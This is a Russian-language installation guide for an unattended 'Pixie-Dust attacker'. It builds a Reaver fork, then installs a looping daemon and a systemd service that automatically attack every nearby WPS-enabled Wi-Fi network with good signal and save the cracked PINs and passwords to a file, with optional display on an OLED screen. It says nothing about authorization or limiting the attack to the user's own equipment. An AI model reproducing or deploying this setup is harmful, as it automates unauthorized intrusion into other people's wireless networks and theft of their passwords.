# 📖 ПИКСИ-ДАСТ АТАКЕР - ПОЛНАЯ ИНСТРУКЦИЯ ПО УСТАНОВКЕ

---

## 📋 СОДЕРЖАНИЕ

1. Требования
2. Установка зависимостей
3. Установка модифицированного Reaver
4. Создание файлов
5. Запуск и проверка
6. Управление службой
7. Настройка интервала
8. Устранение неполадок

---

## 1️⃣ ТРЕБОВАНИЯ

| Компонент | Требование |
|-----------|------------|
| **ОС** | Debian/Ubuntu/Raspberry Pi OS/Kali Linux |
| **Wi-Fi адаптер** | С поддержкой режима монитора (Atheros, Ralink, Realtek) |
| **Права** | root (sudo) |
| **Интернет** | Для установки пакетов |

---

## 2️⃣ УСТАНОВКА ЗАВИСИМОСТЕЙ

```bash
# Обновляем список пакетов
sudo apt update

# Устанавливаем основные пакеты
sudo apt install -y \
    aircrack-ng \
    wireless-tools \
    python3-pip \
    build-essential \
    libpcap-dev \
    libsqlite3-dev \
    git

# Устанавливаем Python библиотеку для OLED (опционально)
pip3 install luma.oled
```

---

## 3️⃣ УСТАНОВКА МОДИФИЦИРОВАННОГО REAVER

Стандартный Reaver **не поддерживает** Pixie Dust. Нужна специальная версия:

```bash
# Удаляем старую версию
sudo apt remove reaver -y

# Клонируем форк с поддержкой Pixie Dust
cd /tmp
git clone https://github.com/t6x/reaver-wps-fork-t6x
cd reaver-wps-fork-t6x/src

# Компилируем
./configure
make

# Устанавливаем
sudo make install

# Проверяем (должна быть опция -K)
reaver -h 2>&1 | grep -i pixie
```

**Ожидаемый вывод:**
```
        -K, --pixie-dust                Run pixiedust attack
```

---

## 4️⃣ СОЗДАНИЕ ФАЙЛОВ

### 4.1 Основной скрипт атаки

```bash
sudo nano /root/pixie_attacker.sh
```

**Скопируйте содержимое** (файл будет предоставлен отдельно) и сохраните (Ctrl+X, Y, Enter).

```bash
# Делаем исполняемым
sudo chmod +x /root/pixie_attacker.sh
```

### 4.2 Скрипт для OLED (опционально)

```bash
sudo nano /root/oled_display.py
```

**Скопируйте содержимое** (файл будет предоставлен отдельно) и сохраните.

```bash
# Делаем исполняемым
sudo chmod +x /root/oled_display.py
```

### 4.3 Демон для циклического запуска

```bash
sudo nano /usr/local/bin/pixie-attacker-daemon.sh
```

**Скопируйте содержимое:**

```bash
#!/bin/bash

# ============================================
# ДЕМОН ДЛЯ PIXIE DUST ATTACKER
# Запускает атаку в цикле
# ============================================

INTERVAL=600  # 10 минут между циклами
LOG_FILE="/var/log/pixie-attacker.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

log "=== Pixie-Dust Attacker Daemon Started ==="

while true; do
    log "--- Starting new attack cycle ---"
    
    # Запускаем основной скрипт в неинтерактивном режиме
    /root/pixie_attacker.sh -t 30 -o /var/log/pixie_results < /dev/null
    
    local exit_code=$?
    log "Attack cycle finished with exit code: $exit_code"
    
    log "Waiting ${INTERVAL} seconds before next cycle..."
    sleep $INTERVAL
done
```

```bash
# Делаем исполняемым
sudo chmod +x /usr/local/bin/pixie-attacker-daemon.sh
```

### 4.4 Служба systemd

```bash
sudo nano /etc/systemd/system/pixie-attacker.service
```

**Скопируйте содержимое:**

```ini
[Unit]
Description=Pixie-Dust WPS Attacker Service
After=network.target multi-user.target
Wants=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root
ExecStart=/usr/local/bin/pixie-attacker-daemon.sh
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
TimeoutStartSec=0
TimeoutStopSec=30

[Install]
WantedBy=multi-user.target
```

### 4.5 Создание директорий

```bash
# Директория для результатов атак
sudo mkdir -p /var/log/pixie_results

# Директория для логов
sudo mkdir -p /var/log
```

---

## 5️⃣ ЗАПУСК И ПРОВЕРКА

### 5.1 Запуск службы

```bash
# Перезагружаем конфигурацию systemd
sudo systemctl daemon-reload

# Включаем автозапуск при загрузке
sudo systemctl enable pixie-attacker

# Запускаем службу сейчас
sudo systemctl start pixie-attacker
```

### 5.2 Проверка статуса

```bash
# Статус службы
sudo systemctl status pixie-attacker
```

**Ожидаемый вывод (активная служба):**
```
● pixie-attacker.service - Pixie-Dust WPS Attacker Service
     Loaded: loaded (/etc/systemd/system/pixie-attacker.service; enabled)
     Active: active (running) since ...
```

### 5.3 Просмотр логов

```bash
# Последние логи
sudo journalctl -u pixie-attacker -n 30

# Следить за логами в реальном времени
sudo journalctl -u pixie-attacker -f
```

### 5.4 Проверка результатов

```bash
# Посмотреть найденные пароли
cat /var/log/pixie_results/cracked_passwords.txt

# Посмотреть лог демона
cat /var/log/pixie-attacker.log
```

---

## 6️⃣ УПРАВЛЕНИЕ СЛУЖБОЙ

| Команда | Действие |
|---------|----------|
| `sudo systemctl start pixie-attacker` | Запустить службу |
| `sudo systemctl stop pixie-attacker` | Остановить службу |
| `sudo systemctl restart pixie-attacker` | Перезапустить службу |
| `sudo systemctl status pixie-attacker` | Показать статус |
| `sudo systemctl enable pixie-attacker` | Автозапуск при загрузке |
| `sudo systemctl disable pixie-attacker` | Отключить автозапуск |
| `sudo journalctl -u pixie-attacker -f` | Следить за логами |
| `sudo journalctl -u pixie-attacker -n 50` | Последние 50 строк логов |

---

## 7️⃣ НАСТРОЙКА ИНТЕРВАЛА

Измените интервал между циклами атаки в файле демона:

```bash
sudo nano /usr/local/bin/pixie-attacker-daemon.sh
```

Найдите строку:
```bash
INTERVAL=600  # 10 минут между циклами
```

**Варианты настройки:**

| Значение | Интервал |
|----------|----------|
| `INTERVAL=300` | 5 минут |
| `INTERVAL=600` | 10 минут |
| `INTERVAL=1800` | 30 минут |
| `INTERVAL=3600` | 1 час |
| `INTERVAL=7200` | 2 часа |
| `INTERVAL=21600` | 6 часов |

После изменения перезапустите службу:
```bash
sudo systemctl restart pixie-attacker
```

---

## 8️⃣ УСТРАНЕНИЕ НЕПОЛАДОК

### ❌ Ошибка: `reaver: command not found`

```bash
# Установите модифицированный Reaver (см. раздел 3)
```

### ❌ Ошибка: `wash: command not found`

```bash
sudo apt install reaver -y
```

### ❌ Ошибка: `status=203/EXEC`

```bash
# Проверьте, что файл существует
ls -la /usr/local/bin/pixie-attacker-daemon.sh

# Проверьте права
sudo chmod +x /usr/local/bin/pixie-attacker-daemon.sh

# Проверьте формат (должен быть LF, не CRLF)
file /usr/local/bin/pixie-attacker-daemon.sh
```

### ❌ Ошибка: `No wireless interfaces found`

```bash
# Проверьте, что Wi-Fi адаптер виден
iwconfig

# Убедитесь, что адаптер поддерживает режим монитора
sudo airmon-ng start wlan0
```

### ❌ Служба не запускается

```bash
# Посмотрите подробные логи
sudo journalctl -u pixie-attacker -n 50 --no-pager

# Проверьте синтаксис service файла
sudo systemd-analyze verify /etc/systemd/system/pixie-attacker.service
```

### ❌ Атака не работает (Pixie Dust)

- Некоторые роутеры **не уязвимы** к Pixie Dust
- Проверьте сигнал (должен быть не слабее -65)
- Убедитесь, что WPS включен и не заблокирован (Locked=No)

---

## 9️⃣ ДОПОЛНИТЕЛЬНЫЕ КОМАНДЫ

### Ручной запуск (интерактивный)

```bash
sudo /root/pixie_attacker.sh
```

### Ручной запуск (неинтерактивный, как из службы)

```bash
sudo /root/pixie_attacker.sh -t 30 -o /var/log/pixie_results < /dev/null
```

### Просмотр всех найденных паролей

```bash
cat /var/log/pixie_results/cracked_passwords.txt
```

### Очистка результатов

```bash
sudo rm -rf /var/log/pixie_results/*
```

### Полная остановка и удаление службы

```bash
sudo systemctl stop pixie-attacker
sudo systemctl disable pixie-attacker
sudo rm /etc/systemd/system/pixie-attacker.service
sudo systemctl daemon-reload
```

---

## 🔟 БЫСТРАЯ УСТАНОВКА (ВСЕ КОМАНДЫ ОДНИМ БЛОКОМ)

```bash
# 1. Зависимости
sudo apt update
sudo apt install -y aircrack-ng wireless-tools python3-pip build-essential libpcap-dev libsqlite3-dev git
pip3 install luma.oled

# 2. Модифицированный Reaver
sudo apt remove reaver -y
cd /tmp
git clone https://github.com/t6x/reaver-wps-fork-t6x
cd reaver-wps-fork-t6x/src
./configure && make && sudo make install
cd ~

# 3. Директории
sudo mkdir -p /var/log/pixie_results

# 4. Запуск службы
sudo systemctl daemon-reload
sudo systemctl enable pixie-attacker
sudo systemctl start pixie-attacker

# 5. Проверка
sudo systemctl status pixie-attacker
sudo journalctl -u pixie-attacker -n 20
```

---

## 📱 ЧТО ПОКАЗЫВАЕТ OLED (если подключен)

| Статус | Экран |
|--------|-------|
| Сканирование | `Scanning WPS...` |
| Найдено сетей | `Found: 5 nets` |
| Атака | `[2/5] Cracking...` + название сети |
| Успех | `CRACKED!` + `PIN: 12345670` + `PASS: MySecret` |
| Не уязвим | `FAILED` + `Not vulnerable` |
| Уже взломана | `SKIPPED` + `Already cracked` |
| Завершение | `COMPLETE!` + `Cracked: 3/5` |

---

## ⚠️ ВАЖНЫЕ ЗАМЕЧАНИЯ

1. **Wi-Fi адаптер** должен быть всегда подключен
2. **Скрипт работает в неинтерактивном режиме** — автоматически атакует сети с хорошим сигналом
3. **Пароли сохраняются** в `/var/log/pixie_results/cracked_passwords.txt`
4. **При повторном запуске** уже взломанные сети пропускаются
5. **Для работы Pixie Dust** нужен уязвимый роутер (не все роутеры подвержены)

---

## 📁 СТРУКТУРА ФАЙЛОВ ПОСЛЕ УСТАНОВКИ

```
/root/
├── pixie_attacker.sh          # Основной скрипт
└── oled_display.py            # OLED поддержка (опционально)

/usr/local/bin/
└── pixie-attacker-daemon.sh   # Демон

/etc/systemd/system/
└── pixie-attacker.service     # systemd служба

/var/log/
├── pixie_results/             # Результаты атак
│   ├── cracked_passwords.txt  # Все пароли
│   └── *.txt                  # Детали по сетям
└── pixie-attacker.log         # Лог демона
```

---

**Установка завершена! Служба автоматически запустится при загрузке системы.** 🔥
